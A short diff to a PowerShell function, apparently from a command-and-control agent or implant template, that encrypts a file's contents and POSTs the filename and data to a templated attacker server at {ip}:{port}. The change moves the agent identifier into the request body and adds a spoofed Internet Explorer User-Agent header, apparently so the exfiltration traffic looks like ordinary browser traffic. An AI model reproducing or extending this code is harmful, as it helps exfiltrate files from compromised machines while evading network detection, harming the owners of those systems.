@@ -13,8 +13,8 @@ function dn($filename){
       $content = enc -key $key -un $file_content -file 1
 
 
-      $postParams = @{f=$filename;d=$content}
-      $output=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
+      $postParams = @{f=$filename;d=$content;resource=$agent}
+      $output=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{download} -Method POST -Body $postParams
       #echo "returned $re.RawContent"
 
 
